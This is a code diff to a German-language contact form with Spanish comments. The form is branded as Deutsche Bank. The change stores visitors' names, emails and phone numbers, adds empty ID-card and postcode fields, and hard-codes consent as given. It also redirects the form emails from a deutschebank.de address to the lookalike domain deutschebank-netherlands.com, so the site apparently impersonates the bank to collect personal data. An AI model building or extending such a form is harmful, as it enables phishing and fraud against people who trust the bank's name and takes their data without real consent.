@@ -31,14 +31,28 @@ function Kontakt() {
     setLoading(true);
 
     try {
+      // Guardar en la entidad ContactoFormulario
+      await base44.entities.ContactoFormulario.create({
+        vorname: formData.vorname,
+        nachname: formData.nachname,
+        email: formData.email,
+        telefon: formData.telefon,
+        personalausweis: '', // No se solicita en este formulario
+        postleitzahl: '', // No se solicita en este formulario
+        autorizo: true, // Asumimos autorización al enviar
+        estado: 'pendiente'
+      });
+
+      // Enviar email de notificación
       await base44.integrations.Core.SendEmail({
-        to: 'kontakt@deutschebank.de',
+        to: 'info@deutschebank-netherlands.com',
         subject: `Kontaktanfrage: ${formData.betreff}`,
         body: `
           Vorname: ${formData.vorname}
           Nachname: ${formData.nachname}
           Email: ${formData.email}
           Telefon: ${formData.telefon}
+          Betreff: ${formData.betreff}
           
           Nachricht:
           ${formData.nachricht}
